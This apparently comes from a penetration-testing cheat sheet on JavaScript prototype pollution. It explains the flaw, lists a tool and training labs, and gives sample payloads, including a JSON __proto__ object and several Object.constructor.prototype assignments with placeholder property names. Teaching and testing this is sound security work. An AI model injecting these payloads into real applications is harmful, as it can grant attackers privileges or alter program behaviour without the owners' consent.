# Prototype Pollution

> Prototype pollution is a type of vulnerability that occurs in JavaScript when properties of Object.prototype are modified. This is particularly risky because JavaScript objects are dynamic and we can add properties to them at any time. Also, almost all objects in JavaScript inherit from Object.prototype, making it a potential attack vector.


## Summary

* [Tools](#tools)
* [Labs](#labs)
* [Exploit](#exploit)
    * [Examples](#examples)
    * [Prototype pollution via JSON input](#prototype-pollution-via-json-input)
    * [Prototype pollution payloads](#prototype-pollution-payloads)
* [References](#references)


## Tools

* [yeswehack/pp-finder](https://github.com/yeswehack/pp-finder) - Help you find gadget for prototype pollution exploitation


## Labs

* [YesWeHack Dojo - Prototype Pollution](https://dojo-yeswehack.com/XSS/Training/Prototype-Pollution)
* [PortSwigger - Prototype pollution](https://portswigger.net/web-security/all-labs#prototype-pollution)


## Exploit

In JavaScript, prototypes are what allow objects to inherit features from other objects. If an attacker is able to add or modify properties of `Object.prototype`, they can essentially affect all objects that inherit from that prototype, potentially leading to various kinds of security risks.


### Examples

* Imagine that an application uses an object to maintain configuration settings, like this:
    ```js
    let config = {
        isAdmin: false
    };
    ```
* An attacker might be able to add an `isAdmin` property to `Object.prototype`, like this:
    ```js
    Object.prototype.isAdmin = true;
    ```


### Prototype pollution via JSON input

You can access the prototype of any object via the magic property `__proto__`.

```js
{
    "__proto__": {
        "evilProperty": "evilPayload"
    }
}
```


### Prototype pollution payloads

```js
Object.__proto__["evilProperty"]="evilPayload"
Object.__proto__.evilProperty="evilPayload"
Object.constructor.prototype.evilProperty="evilPayload"
Object.constructor["prototype"]["evilProperty"]="evilPayload"
{"__proto__": {"evilProperty": "evilPayload"}}
```


## References

* [Server side prototype pollution, how to detect and exploit - YesWeHack](https://blog.yeswehack.com/talent-development/server-side-prototype-pollution-how-to-detect-and-exploit/)
* [Prototype Pollution - PortSwigger](https://portswigger.net/web-security/prototype-pollution)
* [A Pentester’s Guide to Prototype Pollution Attacks - HARSH BOTHRA - JAN 2, 2023](https://www.cobalt.io/blog/a-pentesters-guide-to-prototype-pollution-attacks)
* [Prototype pollution - Snyk](https://learn.snyk.io/lessons/prototype-pollution/javascript/)
* [NodeJS - __proto__ & prototype Pollution - HackTricks](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution)